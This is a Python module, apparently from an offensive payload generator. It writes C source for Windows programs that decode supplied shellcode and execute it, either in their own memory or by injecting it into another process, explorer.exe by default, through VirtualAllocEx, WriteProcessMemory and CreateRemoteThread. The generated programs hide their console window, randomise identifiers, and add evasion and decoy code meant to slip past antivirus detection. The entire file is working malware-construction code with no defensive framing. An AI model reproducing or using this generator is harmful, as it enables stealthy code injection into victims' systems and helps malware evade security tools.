from lib import core, evasion, decoy


def exercise_room(injection_type, processname, vShellcode, decoder_stub, architecture, evasions, decoys, filename):
    exec_code = ""
    evasion_code = ""
    top_funcname_code = ""
    evasion_funcname, evasion_func = evasion.the_great_evasion(architecture, filename)
    decoy_code = decoy.fake_u(decoys)
    final_code = ""

    if injection_type == "local":
        exec_code += local_thread_injection(vShellcode, decoder_stub)
        if evasions == "yes":
            evasion_code += evasion_func
            top_funcname_code += evasion_funcname

        final_code += body_builder(evasion_code, top_funcname_code, exec_code, decoy_code)

    elif injection_type == "remote":
        if evasions == "yes":
            evasion_code += evasion_func
            top_funcname_code += evasion_funcname

        if processname != "":
            exec_code += remote_thread_injection(processname, vShellcode, decoder_stub)

            final_code += body_builder(evasion_code, top_funcname_code, exec_code,decoy_code)


        else:
            processname = "explorer.exe"
            exec_code += remote_thread_injection(processname, vShellcode, decoder_stub)
            final_code += body_builder(evasion_code, top_funcname_code, exec_code, decoy_code)

    return final_code


def body_builder(evasion_code, top_funcname_code, exec_code, decoy_code):
    final_code = headers()
    final_code += evasion_code
    final_code += main()
    final_code += top_funcname_code
    final_code += decoy_code
    final_code += exec_code
    return final_code


def headers():
    header = "#define _WIN32_WINNT 0x0500\n"
    header += "#include <windows.h>\n"
    header += "#include <tlhelp32.h>\n"
    header += "#include <stdio.h>\n"
    header += "#include <stdlib.h>\n"
    header += "#include <time.h>\n\n"
    return header


def main():
    hWnd = core.varname_creator()
    hw = "int main(int argc, char **argv){\n"
    hw += "HWND " + hWnd + " = GetConsoleWindow();\n"
    hw += "ShowWindow(" + hWnd + ", SW_HIDE);\n\n"
    return hw


def local_thread_injection(vShellcode, decoder_stub):
    execs = core.varname_creator()

    lti = decoder_stub
    lti += "\nvoid *" + execs + " = VirtualAlloc(0, sizeof " + vShellcode + ", MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
    lti += "memcpy(" + execs + ", " + vShellcode + ", sizeof " + vShellcode + ");\n"
    lti += "((void(*)())" + execs + ")();\n"
    lti += "}\n"
    return lti


def remote_thread_injection(processname, vShellcode, decoder_stub):
    entry = core.varname_creator()
    snapshot = core.varname_creator()
    process_handle = core.varname_creator()
    remote_thread = core.varname_creator()
    remote_buffer = core.varname_creator()

    rti = decoder_stub
    rti += "\nPROCESSENTRY32 " + entry + ";\n"
    rti += entry + ".dwSize = sizeof(PROCESSENTRY32);\n"
    rti += "HANDLE " + snapshot + " = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n"
    rti += "if (Process32First(" + snapshot + ", &" + entry + ") == TRUE){\n"
    rti += "while (Process32Next(" + snapshot + ", &" + entry + ") == TRUE){\n"
    rti += 'if (stricmp(' + entry + '.szExeFile, ' + '"' + processname + '"' + ') == 0){\n'
    rti += "HANDLE " + process_handle + ";\n"
    rti += "HANDLE " + remote_thread + ";\n"
    rti += "PVOID " + remote_buffer + ";\n"
    rti += process_handle + " = OpenProcess(PROCESS_ALL_ACCESS, FALSE, " + entry + ".th32ProcessID);\n"
    rti += remote_buffer + " = VirtualAllocEx(" + process_handle + ", NULL, sizeof " + vShellcode + ", (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);\n"
    rti += "WriteProcessMemory(" + process_handle + ", " + remote_buffer + ", " + vShellcode + ", sizeof " + vShellcode + ", NULL);\n"
    rti += remote_thread + " = CreateRemoteThread(" + process_handle + ", NULL, 0, (LPTHREAD_START_ROUTINE)" + remote_buffer + ", NULL, 0, NULL);\n"
    rti += "CloseHandle(" + process_handle + ");}}}\n"
    rti += "CloseHandle(" + snapshot + ");}\n"
    return rti
